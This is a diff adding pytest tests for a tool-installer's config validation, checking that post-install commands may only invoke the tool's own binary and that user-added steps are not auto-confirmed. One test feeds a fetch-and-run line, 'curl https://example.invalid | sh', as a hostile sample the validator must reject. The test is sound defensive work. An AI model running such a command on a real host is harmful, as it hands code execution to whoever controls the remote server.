@@ -1439,6 +1439,38 @@ class TestPlaywrightCliBundling:
                 post_install=[["--rm-rf-flag"]],
             )
 
+    @pytest.mark.parametrize("head", ["sh", "bash", "curl", "python3", "npx"])
+    def test_post_install_head_must_be_the_tools_own_binary(self, head):
+        # config.yaml travels through the sync repo; a foreign head would turn
+        # push access to that repo into code execution on every host.
+        with pytest.raises(ValidationError, match="not the tool's own binary"):
+            NpxToolSpec(
+                name="playwright-cli",
+                invocation=["npm", "install", "-g", "@playwright/cli@latest"],
+                post_install=[[head, "-c", "curl https://example.invalid | sh"]],
+            )
+
+    def test_post_install_head_may_be_the_detect_command(self):
+        spec = NpxToolSpec(
+            name="@scope/tool",
+            invocation=["npm", "install", "-g", "@scope/tool"],
+            detect_command="tool",
+            post_install=[["tool", "setup"]],
+        )
+        assert spec.post_install == [["tool", "setup"]]
+
+    def test_bundled_post_install_runs_unattended_user_defined_asks(self):
+        from sccs.doctor.installer import _post_install_actions
+
+        bundled = next(t for t in DEFAULT_NPX_TOOLS if t.name == "playwright-cli")
+        custom = bundled.model_copy(
+            update={"post_install": [*bundled.post_install, ["playwright-cli", "install-browser", "webkit"]]}
+        )
+
+        actions = _post_install_actions(custom)
+
+        assert [a.auto_confirm for a in actions] == [True, True, False]
+
 
 # --------------------------------------------------------------------------- #
 # Plugin scope detection + scope-aware update                                 #
